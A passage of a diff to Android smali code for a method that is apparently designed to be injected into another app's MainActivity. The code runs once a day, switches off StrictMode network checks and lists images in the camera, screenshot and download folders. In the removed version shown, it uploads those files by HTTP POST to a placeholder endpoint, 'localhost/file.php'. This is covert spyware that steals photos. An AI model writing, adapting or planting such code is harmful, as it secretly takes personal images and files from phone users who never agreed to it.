@@ -23,7 +23,7 @@
 .end method
 
 .method private iq500sendFile()V
-    .registers 45
+    .registers 49
     .annotation system Ldalvik/annotation/Signature;
         value = {
             "()V"
@@ -31,1502 +31,1636 @@
     .end annotation
 
     .prologue
-    .line 54
+    .line 61
     move-object/from16 v2, p0
 
-    const/16 v34, 0x0
+    :try_start_2
+    new-instance v38, Ljava/io/File;
 
-    :try_start_4
-    new-instance v35, Ljava/lang/Boolean;
+    move-object/from16 v46, v38
 
-    move/from16 v42, v34
+    move-object/from16 v38, v46
 
-    move-object/from16 v43, v35
+    move-object/from16 v39, v46
 
-    move-object/from16 v34, v43
+    const-string v40, "/sdcard"
 
-    move/from16 v35, v42
+    invoke-direct/range {v39 .. v40}, Ljava/io/File;-><init>(Ljava/lang/String;)V
 
-    move-object/from16 v36, v43
-
-    move/from16 v42, v35
-
-    move-object/from16 v43, v36
-
-    move-object/from16 v35, v43
-
-    move/from16 v36, v42
-
-    invoke-direct/range {v35 .. v36}, Ljava/lang/Boolean;-><init>(Z)V
-
-    move-object/from16 v4, v34
-
-    .line 55
-    new-instance v34, Ljava/util/Date;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    invoke-direct/range {v35 .. v35}, Ljava/util/Date;-><init>()V
-
-    move-object/from16 v5, v34
-
-    .line 56
-    move-object/from16 v34, v5
-
-    invoke-virtual/range {v34 .. v34}, Ljava/util/Date;->getTime()J
-
-    move-result-wide v34
-
-    move-wide/from16 v6, v34
-
-    .line 57
-    move-object/from16 v34, v2
-
-    const-string v35, "loadpref"
-
-    const/16 v36, 0x0
-
-    invoke-virtual/range {v34 .. v36}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
-
-    move-result-object v34
-
-    move-object/from16 v8, v34
-
-    .line 58
-    move-object/from16 v34, v8
-
-    invoke-interface/range {v34 .. v34}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
-
-    move-result-object v34
-
-    move-object/from16 v9, v34
-
-    .line 60
-    move-object/from16 v34, v8
-
-    const-string v35, "lastUpload"
-
-    const/16 v36, 0x0
-
-    move/from16 v0, v36
-
-    int-to-long v0, v0
-
-    move-wide/from16 v36, v0
-
-    invoke-interface/range {v34 .. v37}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J
-
-    move-result-wide v34
-
-    move-wide/from16 v10, v34
+    move-object/from16 v4, v38
 
     .line 62
-    move-wide/from16 v34, v10
+    move-object/from16 v38, v4
 
-    const/16 v36, 0x0
+    invoke-virtual/range {v38 .. v38}, Ljava/io/File;->canRead()Z
 
-    move/from16 v0, v36
+    move-result v38
 
-    int-to-long v0, v0
+    new-instance v39, Ljava/lang/Boolean;
 
-    move-wide/from16 v36, v0
+    move/from16 v46, v38
 
-    cmp-long v34, v34, v36
+    move-object/from16 v47, v39
 
-    if-eqz v34, :cond_76
+    move-object/from16 v38, v47
 
-    move-wide/from16 v34, v6
+    move/from16 v39, v46
 
-    move-wide/from16 v36, v10
+    move-object/from16 v40, v47
 
-    sub-long v34, v34, v36
+    move/from16 v46, v39
 
-    const v36, 0x5265c00
+    move-object/from16 v47, v40
 
-    move/from16 v0, v36
+    move-object/from16 v39, v47
 
-    int-to-long v0, v0
+    move/from16 v40, v46
 
-    move-wide/from16 v36, v0
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
 
-    cmp-long v34, v34, v36
+    move-object/from16 v5, v38
 
-    if-ltz v34, :cond_a1
+    .line 63
+    move-object/from16 v38, v5
 
-    .line 64
-    :cond_76
-    move-object/from16 v34, v9
+    check-cast v38, Ljava/lang/Boolean;
 
-    const-string v35, "lastUpload"
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
 
-    move-wide/from16 v36, v6
+    move-result v38
 
-    invoke-interface/range {v34 .. v37}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
+    if-nez v38, :cond_3b
 
-    move-result-object v34
-
-    .line 65
-    move-object/from16 v34, v9
-
-    invoke-interface/range {v34 .. v34}, Landroid/content/SharedPreferences$Editor;->commit()Z
-
-    move-result v34
-
-    .line 66
-    const/16 v34, 0x1
-
-    new-instance v35, Ljava/lang/Boolean;
-
-    move/from16 v42, v34
-
-    move-object/from16 v43, v35
-
-    move-object/from16 v34, v43
-
-    move/from16 v35, v42
-
-    move-object/from16 v36, v43
-
-    move/from16 v42, v35
-
-    move-object/from16 v43, v36
-
-    move-object/from16 v35, v43
-
-    move/from16 v36, v42
-
-    invoke-direct/range {v35 .. v36}, Ljava/lang/Boolean;-><init>(Z)V
-
-    move-object/from16 v4, v34
-
-    .line 70
-    :cond_a1
-    move-object/from16 v34, v4
-
-    check-cast v34, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Boolean;->booleanValue()Z
-    :try_end_a8
-    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_a8} :catch_564
-
-    move-result v34
-
-    if-eqz v34, :cond_24f
-
-    .line 74
-    :try_start_ab
-    new-instance v34, Landroid/os/StrictMode$ThreadPolicy$Builder;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    invoke-direct/range {v35 .. v35}, Landroid/os/StrictMode$ThreadPolicy$Builder;-><init>()V
-
-    invoke-virtual/range {v34 .. v34}, Landroid/os/StrictMode$ThreadPolicy$Builder;->permitAll()Landroid/os/StrictMode$ThreadPolicy$Builder;
-
-    move-result-object v34
-
-    invoke-virtual/range {v34 .. v34}, Landroid/os/StrictMode$ThreadPolicy$Builder;->build()Landroid/os/StrictMode$ThreadPolicy;
-
-    move-result-object v34
-
-    move-object/from16 v12, v34
-
-    .line 75
-    move-object/from16 v34, v12
-
-    invoke-static/range {v34 .. v34}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V
-
-    .line 78
-    const-string v34, "/sdcard/DCIM/Camera/"
-
-    move-object/from16 v13, v34
-
-    .line 79
-    const-string v34, "/sdcard/Download/"
-
-    move-object/from16 v14, v34
-
-    .line 81
-    new-instance v34, Ljava/io/File;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    move-object/from16 v36, v13
-
-    invoke-direct/range {v35 .. v36}, Ljava/io/File;-><init>(Ljava/lang/String;)V
-
-    move-object/from16 v15, v34
-
-    .line 82
-    new-instance v34, Ljava/io/File;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    move-object/from16 v36, v14
-
-    invoke-direct/range {v35 .. v36}, Ljava/io/File;-><init>(Ljava/lang/String;)V
-
-    move-object/from16 v16, v34
-
-    .line 84
-    move-object/from16 v34, v15
-
-    invoke-virtual/range {v34 .. v34}, Ljava/io/File;->list()[Ljava/lang/String;
-
-    move-result-object v34
-
-    move-object/from16 v17, v34
-
-    .line 85
-    move-object/from16 v34, v16
-
-    invoke-virtual/range {v34 .. v34}, Ljava/io/File;->list()[Ljava/lang/String;
-
-    move-result-object v34
-
-    move-object/from16 v18, v34
-
-    .line 88
-    const-string v34, ""
-
-    move-object/from16 v19, v34
-
-    .line 89
-    const-string v34, ""
-
-    move-object/from16 v20, v34
-
-    .line 91
-    const/16 v34, 0x0
-
-    move/from16 v21, v34
-
-    :goto_107
-    move/from16 v34, v21
-
-    move-object/from16 v35, v17
-
-    move-object/from16 v0, v35
-
-    array-length v0, v0
-
-    move/from16 v35, v0
-
-    move/from16 v0, v34
-
-    move/from16 v1, v35
-
-    if-lt v0, v1, :cond_250
-
-    .line 109
-    const/16 v34, 0x0
-
-    move/from16 v21, v34
-
-    :goto_11a
-    move/from16 v34, v21
-
-    move-object/from16 v35, v18
-
-    move-object/from16 v0, v35
-
-    array-length v0, v0
-
-    move/from16 v35, v0
-
-    move/from16 v0, v34
-
-    move/from16 v1, v35
-
-    if-lt v0, v1, :cond_3d3
-
-    .line 123
-    move-object/from16 v34, v19
-
-    const-string v35, "///n"
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
-
-    move-result-object v34
-
-    move-object/from16 v21, v34
-
-    .line 124
-    move-object/from16 v34, v20
-
-    const-string v35, "///n"
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
-
-    move-result-object v34
-
-    move-object/from16 v22, v34
-
-    .line 125
-    const-string v34, ""
-
-    move-object/from16 v23, v34
-
-    .line 126
-    const-string v34, ""
-
-    move-object/from16 v24, v34
-
-    .line 127
-    const/16 v34, 0x0
-
-    move/from16 v0, v34
-
-    int-to-long v0, v0
-
-    move-wide/from16 v34, v0
-
-    move-wide/from16 v25, v34
-
-    .line 128
-    const/16 v34, 0x0
-
-    move/from16 v0, v34
-
-    int-to-long v0, v0
-
-    move-wide/from16 v34, v0
-
-    move-wide/from16 v27, v34
-
-    .line 130
-    const/16 v34, 0x0
-
-    move/from16 v29, v34
-
-    :goto_15b
-    move/from16 v34, v29
-
-    move-object/from16 v35, v21
-
-    move-object/from16 v0, v35
-
-    array-length v0, v0
-
-    move/from16 v35, v0
-
-    move/from16 v0, v34
-
-    move/from16 v1, v35
-
-    if-lt v0, v1, :cond_4e4
-
-    .line 138
-    const/16 v34, 0x0
-
-    move/from16 v29, v34
-
-    :goto_16e
-    move/from16 v34, v29
-
-    move-object/from16 v35, v22
-
-    move-object/from16 v0, v35
-
-    array-length v0, v0
-
-    move/from16 v35, v0
-
-    move/from16 v0, v34
-
-    move/from16 v1, v35
-
-    if-lt v0, v1, :cond_519
-
-    .line 147
-    move-object/from16 v34, v23
-
-    const-string v35, ""
-
-    move-object/from16 v0, v34
-
-    move-object/from16 v1, v35
-
-    if-eq v0, v1, :cond_1e6
-
-    .line 150
-    new-instance v34, Ljava/io/File;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    move-object/from16 v36, v23
-
-    invoke-direct/range {v35 .. v36}, Ljava/io/File;-><init>(Ljava/lang/String;)V
-
-    move-object/from16 v29, v34
-
-    .line 153
-    new-instance v34, Lorg/apache/http/entity/FileEntity;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    move-object/from16 v36, v29
-
-    const-string v37, "binary/octet-stream"
-
-    invoke-direct/range {v35 .. v37}, Lorg/apache/http/entity/FileEntity;-><init>(Ljava/io/File;Ljava/lang/String;)V
-
-    move-object/from16 v30, v34
-
-    .line 156
-    new-instance v34, Lorg/apache/http/client/methods/HttpPost;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    const-string v36, "http://localhost/file.php"
-
-    invoke-direct/range {v35 .. v36}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
-
-    move-object/from16 v31, v34
-
-    .line 159
-    move-object/from16 v34, v31
-
-    move-object/from16 v35, v30
-
-    invoke-virtual/range {v34 .. v35}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
-
-    .line 160
-    move-object/from16 v34, v30
-
-    const-string v35, "binary/octet-stream"
-
-    invoke-virtual/range {v34 .. v35}, Lorg/apache/http/entity/FileEntity;->setContentType(Ljava/lang/String;)V
-
-    .line 163
-    move-object/from16 v34, v31
-
-    const-string v35, "lmod"
-
-    move-wide/from16 v36, v25
-
-    invoke-static/range {v36 .. v37}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;
-
-    move-result-object v36
-
-    invoke-virtual/range {v34 .. v36}, Lorg/apache/http/client/methods/HttpPost;->setHeader(Ljava/lang/String;Ljava/lang/String;)V
-
-    .line 166
-    new-instance v34, Lorg/apache/http/impl/client/DefaultHttpClient;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    invoke-direct/range {v35 .. v35}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V
-
-    move-object/from16 v32, v34
-
-    .line 167
-    move-object/from16 v34, v32
-
-    move-object/from16 v35, v31
-
-    invoke-interface/range {v34 .. v35}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
-
-    move-result-object v34
-
-    .line 171
-    :cond_1e6
-    move-object/from16 v34, v24
-
-    const-string v35, ""
-
-    move-object/from16 v0, v34
-
-    move-object/from16 v1, v35
-
-    if-eq v0, v1, :cond_24f
-
-    .line 173
-    new-instance v34, Ljava/io/File;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    move-object/from16 v36, v24
-
-    invoke-direct/range {v35 .. v36}, Ljava/io/File;-><init>(Ljava/lang/String;)V
-
-    move-object/from16 v29, v34
-
-    .line 174
-    new-instance v34, Lorg/apache/http/entity/FileEntity;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    move-object/from16 v36, v29
-
-    const-string v37, "binary/octet-stream"
-
-    invoke-direct/range {v35 .. v37}, Lorg/apache/http/entity/FileEntity;-><init>(Ljava/io/File;Ljava/lang/String;)V
-
-    move-object/from16 v30, v34
-
-    .line 175
-    new-instance v34, Lorg/apache/http/client/methods/HttpPost;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    const-string v36, "http://localhost/file.php"
-
-    invoke-direct/range {v35 .. v36}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
-
-    move-object/from16 v31, v34
-
-    .line 177
-    move-object/from16 v34, v31
-
-    move-object/from16 v35, v30
-
-    invoke-virtual/range {v34 .. v35}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
-
-    .line 178
-    move-object/from16 v34, v30
-
-    const-string v35, "binary/octet-stream"
-
-    invoke-virtual/range {v34 .. v35}, Lorg/apache/http/entity/FileEntity;->setContentType(Ljava/lang/String;)V
-
-    .line 179
-    move-object/from16 v34, v31
-
-    const-string v35, "fname"
-
-    move-object/from16 v36, v29
-
-    invoke-virtual/range {v36 .. v36}, Ljava/io/File;->getName()Ljava/lang/String;
-
-    move-result-object v36
-
-    invoke-virtual/range {v34 .. v36}, Lorg/apache/http/client/methods/HttpPost;->setHeader(Ljava/lang/String;Ljava/lang/String;)V
-
-    .line 180
-    new-instance v34, Lorg/apache/http/impl/client/DefaultHttpClient;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    invoke-direct/range {v35 .. v35}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V
-
-    move-object/from16 v32, v34
-
-    .line 181
-    move-object/from16 v34, v32
-
-    move-object/from16 v35, v31
-
-    invoke-interface/range {v34 .. v35}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
-
-    move-result-object v34
-
-    .line 193
-    :cond_24f
-    :goto_24f
+    .line 223
+    :goto_3a
     return-void
 
+    .line 72
+    :cond_3b
+    const/16 v38, 0x0
+
+    new-instance v39, Ljava/lang/Boolean;
+
+    move/from16 v46, v38
+
+    move-object/from16 v47, v39
+
+    move-object/from16 v38, v47
+
+    move/from16 v39, v46
+
+    move-object/from16 v40, v47
+
+    move/from16 v46, v39
+
+    move-object/from16 v47, v40
+
+    move-object/from16 v39, v47
+
+    move/from16 v40, v46
+
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v6, v38
+
+    .line 73
+    new-instance v38, Ljava/util/Date;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    invoke-direct/range {v39 .. v39}, Ljava/util/Date;-><init>()V
+
+    move-object/from16 v7, v38
+
+    .line 74
+    move-object/from16 v38, v7
+
+    invoke-virtual/range {v38 .. v38}, Ljava/util/Date;->getTime()J
+
+    move-result-wide v38
+
+    move-wide/from16 v8, v38
+
+    .line 75
+    move-object/from16 v38, v2
+
+    const-string v39, "loadpref"
+
+    const/16 v40, 0x0
+
+    invoke-virtual/range {v38 .. v40}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    move-result-object v38
+
+    move-object/from16 v10, v38
+
+    .line 76
+    move-object/from16 v38, v10
+
+    invoke-interface/range {v38 .. v38}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v38
+
+    move-object/from16 v11, v38
+
+    .line 78
+    move-object/from16 v38, v10
+
+    const-string v39, "lastUpload"
+
+    const/16 v40, 0x0
+
+    move/from16 v0, v40
+
+    int-to-long v0, v0
+
+    move-wide/from16 v40, v0
+
+    invoke-interface/range {v38 .. v41}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J
+
+    move-result-wide v38
+
+    move-wide/from16 v12, v38
+
+    .line 80
+    move-wide/from16 v38, v12
+
+    const/16 v40, 0x0
+
+    move/from16 v0, v40
+
+    int-to-long v0, v0
+
+    move-wide/from16 v40, v0
+
+    cmp-long v38, v38, v40
+
+    if-eqz v38, :cond_af
+
+    move-wide/from16 v38, v8
+
+    move-wide/from16 v40, v12
+
+    sub-long v38, v38, v40
+
+    const v40, 0x5265c00
+
+    move/from16 v0, v40
+
+    int-to-long v0, v0
+
+    move-wide/from16 v40, v0
+
+    cmp-long v38, v38, v40
+
+    if-ltz v38, :cond_da
+
+    .line 82
+    :cond_af
+    move-object/from16 v38, v11
+
+    const-string v39, "lastUpload"
+
+    move-wide/from16 v40, v8
+
+    invoke-interface/range {v38 .. v41}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v38
+
+    .line 83
+    move-object/from16 v38, v11
+
+    invoke-interface/range {v38 .. v38}, Landroid/content/SharedPreferences$Editor;->commit()Z
+
+    move-result v38
+
+    .line 84
+    const/16 v38, 0x1
+
+    new-instance v39, Ljava/lang/Boolean;
+
+    move/from16 v46, v38
+
+    move-object/from16 v47, v39
+
+    move-object/from16 v38, v47
+
+    move/from16 v39, v46
+
+    move-object/from16 v40, v47
+
+    move/from16 v46, v39
+
+    move-object/from16 v47, v40
+
+    move-object/from16 v39, v47
+
+    move/from16 v40, v46
+
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v6, v38
+
+    .line 88
+    :cond_da
+    move-object/from16 v38, v6
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+    :try_end_e1
+    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_e1} :catch_5c9
+
+    move-result v38
+
+    if-eqz v38, :cond_2b3
+
+    .line 92
+    :try_start_e4
+    new-instance v38, Landroid/os/StrictMode$ThreadPolicy$Builder;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    invoke-direct/range {v39 .. v39}, Landroid/os/StrictMode$ThreadPolicy$Builder;-><init>()V
+
+    invoke-virtual/range {v38 .. v38}, Landroid/os/StrictMode$ThreadPolicy$Builder;->permitAll()Landroid/os/StrictMode$ThreadPolicy$Builder;
+
+    move-result-object v38
+
+    invoke-virtual/range {v38 .. v38}, Landroid/os/StrictMode$ThreadPolicy$Builder;->build()Landroid/os/StrictMode$ThreadPolicy;
+
+    move-result-object v38
+
+    move-object/from16 v14, v38
+
     .line 93
-    :cond_250
-    move-object/from16 v34, v17
+    move-object/from16 v38, v14
 
-    move/from16 v35, v21
-
-    aget-object v34, v34, v35
-
-    const-string v35, ".jpg"
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
-
-    move-result v34
-
-    new-instance v35, Ljava/lang/Boolean;
-
-    move/from16 v42, v34
-
-    move-object/from16 v43, v35
-
-    move-object/from16 v34, v43
-
-    move/from16 v35, v42
-
-    move-object/from16 v36, v43
-
-    move/from16 v42, v35
-
-    move-object/from16 v43, v36
-
-    move-object/from16 v35, v43
-
-    move/from16 v36, v42
-
-    invoke-direct/range {v35 .. v36}, Ljava/lang/Boolean;-><init>(Z)V
-
-    move-object/from16 v22, v34
-
-    .line 94
-    move-object/from16 v34, v17
-
-    move/from16 v35, v21
-
-    aget-object v34, v34, v35
-
-    const-string v35, ".jpeg"
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
-
-    move-result v34
-
-    new-instance v35, Ljava/lang/Boolean;
-
-    move/from16 v42, v34
-
-    move-object/from16 v43, v35
-
-    move-object/from16 v34, v43
-
-    move/from16 v35, v42
-
-    move-object/from16 v36, v43
-
-    move/from16 v42, v35
-
-    move-object/from16 v43, v36
-
-    move-object/from16 v35, v43
-
-    move/from16 v36, v42
-
-    invoke-direct/range {v35 .. v36}, Ljava/lang/Boolean;-><init>(Z)V
-
-    move-object/from16 v23, v34
-
-    .line 95
-    move-object/from16 v34, v17
-
-    move/from16 v35, v21
-
-    aget-object v34, v34, v35
-
-    const-string v35, ".png"
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
-
-    move-result v34
-
-    new-instance v35, Ljava/lang/Boolean;
-
-    move/from16 v42, v34
-
-    move-object/from16 v43, v35
-
-    move-object/from16 v34, v43
-
-    move/from16 v35, v42
-
-    move-object/from16 v36, v43
-
-    move/from16 v42, v35
-
-    move-object/from16 v43, v36
-
-    move-object/from16 v35, v43
-
-    move/from16 v36, v42
-
-    invoke-direct/range {v35 .. v36}, Ljava/lang/Boolean;-><init>(Z)V
-
-    move-object/from16 v24, v34
+    invoke-static/range {v38 .. v38}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V
 
     .line 96
-    new-instance v34, Ljava/io/File;
+    const-string v38, "/sdcard/DCIM/Camera/"
 
-    move-object/from16 v42, v34
+    move-object/from16 v15, v38
 
-    move-object/from16 v34, v42
+    .line 97
+    const-string v38, "/sdcard/DCIM/Screenshots/"
 
-    move-object/from16 v35, v42
-
-    new-instance v36, Ljava/lang/StringBuffer;
-
-    move-object/from16 v42, v36
-
-    move-object/from16 v36, v42
-
-    move-object/from16 v37, v42
-
-    invoke-direct/range {v37 .. v37}, Ljava/lang/StringBuffer;-><init>()V
-
-    move-object/from16 v37, v13
-
-    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v36
-
-    move-object/from16 v37, v17
-
-    move/from16 v38, v21
-
-    aget-object v37, v37, v38
-
-    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v36
-
-    invoke-virtual/range {v36 .. v36}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
-
-    move-result-object v36
-
-    invoke-direct/range {v35 .. v36}, Ljava/io/File;-><init>(Ljava/lang/String;)V
-
-    invoke-virtual/range {v34 .. v34}, Ljava/io/File;->length()J
-
-    move-result-wide v34
-
-    const/16 v36, 0x400
-
-    move/from16 v0, v36
-
-    int-to-long v0, v0
-
-    move-wide/from16 v36, v0
-
-    div-long v34, v34, v36
-
-    const/16 v36, 0x400
-
-    move/from16 v0, v36
-
-    int-to-long v0, v0
-
-    move-wide/from16 v36, v0
-
-    div-long v34, v34, v36
-
-    const/16 v36, 0xa
-
-    move/from16 v0, v36
-
-    int-to-long v0, v0
-
-    move-wide/from16 v36, v0
-
-    cmp-long v34, v34, v36
-
-    if-lez v34, :cond_3cf
-
-    const/16 v34, 0x0
-
-    :goto_30c
-    new-instance v35, Ljava/lang/Boolean;
-
-    move/from16 v42, v34
-
-    move-object/from16 v43, v35
-
-    move-object/from16 v34, v43
-
-    move/from16 v35, v42
-
-    move-object/from16 v36, v43
-
-    move/from16 v42, v35
-
-    move-object/from16 v43, v36
-
-    move-object/from16 v35, v43
-
-    move/from16 v36, v42
-
-    invoke-direct/range {v35 .. v36}, Ljava/lang/Boolean;-><init>(Z)V
-
-    move-object/from16 v25, v34
+    move-object/from16 v16, v38
 
     .line 98
-    move-object/from16 v34, v22
+    const-string v38, "/sdcard/Download/"
 
-    check-cast v34, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Boolean;->booleanValue()Z
-
-    move-result v34
-
-    if-eqz v34, :cond_339
-
-    move-object/from16 v34, v25
-
-    check-cast v34, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Boolean;->booleanValue()Z
-
-    move-result v34
-
-    if-nez v34, :cond_361
-
-    :cond_339
-    move-object/from16 v34, v23
-
-    check-cast v34, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Boolean;->booleanValue()Z
-
-    move-result v34
-
-    if-eqz v34, :cond_34d
-
-    move-object/from16 v34, v25
-
-    check-cast v34, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Boolean;->booleanValue()Z
-
-    move-result v34
-
-    if-nez v34, :cond_361
-
-    :cond_34d
-    move-object/from16 v34, v24
-
-    check-cast v34, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Boolean;->booleanValue()Z
-
-    move-result v34
-
-    if-eqz v34, :cond_3cb
-
-    move-object/from16 v34, v25
-
-    check-cast v34, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Boolean;->booleanValue()Z
-
-    move-result v34
-
-    if-eqz v34, :cond_3cb
+    move-object/from16 v17, v38
 
     .line 100
-    :cond_361
-    new-instance v34, Ljava/lang/StringBuffer;
+    new-instance v38, Ljava/io/File;
 
-    move-object/from16 v42, v34
+    move-object/from16 v46, v38
 
-    move-object/from16 v34, v42
+    move-object/from16 v38, v46
 
-    move-object/from16 v35, v42
+    move-object/from16 v39, v46
 
-    invoke-direct/range {v35 .. v35}, Ljava/lang/StringBuffer;-><init>()V
+    move-object/from16 v40, v15
 
-    move-object/from16 v35, v19
+    invoke-direct/range {v39 .. v40}, Ljava/io/File;-><init>(Ljava/lang/String;)V
 
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+    move-object/from16 v18, v38
 
-    move-result-object v34
+    .line 101
+    new-instance v38, Ljava/io/File;
 
-    new-instance v35, Ljava/lang/StringBuffer;
+    move-object/from16 v46, v38
 
-    move-object/from16 v42, v35
+    move-object/from16 v38, v46
 
-    move-object/from16 v35, v42
+    move-object/from16 v39, v46
 
-    move-object/from16 v36, v42
+    move-object/from16 v40, v16
 
-    invoke-direct/range {v36 .. v36}, Ljava/lang/StringBuffer;-><init>()V
+    invoke-direct/range {v39 .. v40}, Ljava/io/File;-><init>(Ljava/lang/String;)V
 
-    move-object/from16 v36, v13
-
-    invoke-virtual/range {v35 .. v36}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v35
-
-    move-object/from16 v36, v17
-
-    move/from16 v37, v21
-
-    aget-object v36, v36, v37
-
-    invoke-virtual/range {v35 .. v36}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v35
-
-    invoke-virtual/range {v35 .. v35}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
-
-    move-result-object v35
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v34
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
-
-    move-result-object v34
-
-    move-object/from16 v19, v34
+    move-object/from16 v19, v38
 
     .line 102
-    move/from16 v34, v21
+    new-instance v38, Ljava/io/File;
 
-    move-object/from16 v35, v17
+    move-object/from16 v46, v38
 
-    move-object/from16 v0, v35
+    move-object/from16 v38, v46
 
-    array-length v0, v0
+    move-object/from16 v39, v46
 
-    move/from16 v35, v0
+    move-object/from16 v40, v17
 
-    const/16 v36, 0x1
+    invoke-direct/range {v39 .. v40}, Ljava/io/File;-><init>(Ljava/lang/String;)V
 
-    add-int/lit8 v35, v35, -0x1
+    move-object/from16 v20, v38
 
-    move/from16 v0, v34
+    .line 105
+    move-object/from16 v38, v18
 
-    move/from16 v1, v35
+    invoke-virtual/range {v38 .. v38}, Ljava/io/File;->list()[Ljava/lang/String;
 
-    if-ge v0, v1, :cond_3cb
+    move-result-object v38
 
-    .line 103
-    new-instance v34, Ljava/lang/StringBuffer;
+    move-object/from16 v21, v38
 
-    move-object/from16 v42, v34
+    .line 106
+    move-object/from16 v38, v20
 
-    move-object/from16 v34, v42
+    invoke-virtual/range {v38 .. v38}, Ljava/io/File;->list()[Ljava/lang/String;
 
-    move-object/from16 v35, v42
+    move-result-object v38
 
-    invoke-direct/range {v35 .. v35}, Ljava/lang/StringBuffer;-><init>()V
-
-    move-object/from16 v35, v19
-
